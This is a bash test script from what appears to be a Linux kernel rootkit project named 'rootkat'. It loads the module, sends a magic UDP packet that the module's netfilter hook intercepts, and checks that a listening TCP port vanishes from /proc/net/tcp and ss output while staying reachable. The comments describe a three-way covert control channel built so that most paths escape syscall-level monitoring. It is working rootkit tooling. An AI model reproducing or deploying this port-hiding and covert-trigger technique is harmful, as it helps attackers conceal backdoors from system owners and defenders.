#!/usr/bin/env bash
# Asserts: a UDP packet whose payload begins with the rootkat magic
# frame, sent to ANY port on this host, triggers a hide-port action
# without needing a listening UDP socket. Demonstrates that the
# netfilter PRE_ROUTING hook sees the packet at L3 before any local
# socket dispatch — and silently drops it after acting.
#
# This is the "remote" leg of the local/IPC/remote control-channel
# triptych. Local: kill(_, 62..64). IPC: io_uring NOP SQE with magic
# user_data. Remote: this. Same magic_actions reachable three ways;
# only the kill path is visible to syscall-level monitoring.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

PORT=12360

tcp_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[2])}' /proc/net/tcp
}

# ROOTKAT_NET_ACT_HIDE_PORT = 2 (matches lkm/hook_netfilter.h).
send_magic() {
	local action="$1" arg="$2"
	python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'rootkat\x00' + bytes([$action]) + b'\x00\x00\x00' + struct.pack('!I', $arg)
s.sendto(payload, ('127.0.0.1', 65000))
s.close()
"
}

assert_zero "module loads" insmod lkm/rootkat.ko

# Bring up a TCP listener — no kill-magic flag, port is visible.
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3
NET_PID=$!
sleep 0.2

assert_zero "baseline: /proc/net/tcp has port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"

# Trigger hide via the netfilter channel. UDP, no listener required —
# the rootkat module catches the packet at NF_INET_PRE_ROUTING.
send_magic 2 $PORT
sleep 0.2

assert_nonzero "post-magic: /proc/net/tcp omits port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"

assert_nonzero "post-magic: ss -tln omits port (netlink hook)" \
	bash -c "ss -tln | grep -q ':$PORT '"

# Sanity: target port still receives connections — we hide from
# enumeration only.
assert_zero "post-magic: still connectable via known port" \
	bash -c "exec 4<>/dev/tcp/127.0.0.1/$PORT && exec 4<&- 4>&-"

kill $NET_PID 2>/dev/null || true
wait $NET_PID 2>/dev/null || true
exec 3<&-

assert_zero "module unloads" rmmod rootkat

# After unload the netfilter hook is gone — same magic packet has no
# effect, port stays visible.
sleep 0.3
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3
POST_PID=$!
sleep 0.2

send_magic 2 $PORT
sleep 0.2

assert_zero "post-unload: magic packet has no effect" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"

kill $POST_PID 2>/dev/null || true
wait $POST_PID 2>/dev/null || true
exec 3<&-

report
